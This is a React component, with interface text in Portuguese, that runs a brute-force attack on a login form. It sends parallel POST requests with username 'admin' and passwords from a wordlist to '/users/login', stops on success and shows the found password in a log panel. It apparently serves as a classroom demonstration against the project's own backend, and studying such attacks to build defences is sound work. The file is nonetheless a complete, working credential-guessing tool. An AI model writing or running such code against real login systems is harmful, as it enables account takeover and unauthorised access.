
import React from 'react'
import wordlist from '../data/wordlist'
import myfetch from '../lib/myfetch'


export default function BruteForce() {
 const [logs, setLogs] = React.useState([])
 const [isRunning, setIsRunning] = React.useState(false)
 const stopRef = React.useRef(false)
 const logsEndRef = React.useRef(null)
 const [concurrency, setConcurrency] = React.useState(5) // Número de requisições paralelas


 // Auto-scroll para o topo quando novos logs são adicionados
 React.useEffect(() => {
   logsEndRef.current?.scrollTo(0, 0)
 }, [logs])


 function tryPassword(password) {
   return myfetch.post('/users/login', {
     username: 'admin',
     password
   })
   .then(() => 'OK')
   .catch(error => error.message)
 }


 async function handleStartClick() {
   setIsRunning(true)
   stopRef.current = false
   setLogs([])


   const batchSize = concurrency
   let found = false


   for (let i = 0; i < wordlist.length && !found; i += batchSize) {
     if (stopRef.current) break


     const batch = wordlist.slice(i, i + batchSize)
     const promises = batch.map((password, index) =>
       tryPassword(password)
         .then(result => {
           const attemptNumber = i + index
           const newLog = result === 'OK'
             ? `SENHA ENCONTRADA, tentativa nº ${attemptNumber}: ${password}`
             : `Tentativa nº ${attemptNumber} (${password}) => ${result}`


           setLogs(prevLogs => [newLog, ...prevLogs])
           return result
         })
     )


     const results = await Promise.all(promises)
     found = results.some(result => result === 'OK')


     // Pequena pausa para evitar bloqueio da UI
     await new Promise(resolve => requestAnimationFrame(resolve))
   }


   setIsRunning(false)
 }


 function handleStopClick() {
   stopRef.current = true
 }


 return (
   <>
     <h1>Ataque de força bruta no <em>login</em></h1>
     <div style={{ marginBottom: '1rem' }}>
       <label>
         Concorrência:
         <input
           type="number"
           min="1"
           max="20"
           value={concurrency}
           onChange={(e) => setConcurrency(Math.min(20, Math.max(1, parseInt(e.target.value) || 1)))}
           disabled={isRunning}
           style={{ marginLeft: '0.5rem', width: '50px' }}
         />
       </label>
     </div>
     <div style={{
       display: 'flex',
       justifyContent: 'space-around',
       marginBottom: '1rem'
     }}>
       <button onClick={handleStartClick} disabled={isRunning}>
         Iniciar
       </button>
       <button onClick={handleStopClick} disabled={!isRunning}>
         Parar
       </button>
     </div>
     <div
       ref={logsEndRef}
       style={{
         fontFamily: 'monospace',
         height: '400px',
         overflowY: 'auto',
         border: '1px solid #ccc',
         padding: '0.5rem',
         color: '#555',
         backgroundColor: '#f5f5f5'
       }}
     >
       {logs.length > 0 ? (
         <ul style={{ listStyleType: 'none', padding: 0, margin: 0 }}>
           {logs.map((log, index) => (
             <li
               key={index}
               style={{
                 padding: '0.25rem 0',
                 borderBottom: index < logs.length - 1 ? '1px solid #eee' : 'none',
                 color: log.includes('SENHA ENCONTRADA') ? 'green' : 'inherit'
               }}
             >
               {log}
             </li>
           ))}
         </ul>
       ) : (
         <div style={{ color: '#555' }}>Nenhum log disponível. Clique em Iniciar para começar.</div>
       )}
     </div>
   </>
 )
}

